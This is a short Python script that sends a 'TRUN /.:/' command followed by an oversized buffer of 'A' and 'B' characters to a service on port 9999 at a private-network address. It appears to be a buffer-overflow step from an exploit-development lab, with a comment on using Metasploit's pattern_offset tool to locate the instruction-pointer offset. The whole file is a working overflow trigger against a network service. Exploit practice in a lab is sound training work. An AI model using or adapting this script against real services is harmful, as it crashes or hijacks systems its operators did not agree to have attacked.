#!/usr/bin/python

import sys
import socket 

shellcode = "A" * 2003 + "B" * 4  #place this in terminal /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q (EIP) so you can get the number like 2004


try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.0.0.27',9999))
	s.send(('TRUN /.:/' + shellcode)) 
	s.close()

except:
	print ('error connecting to server')
	sys.exit()

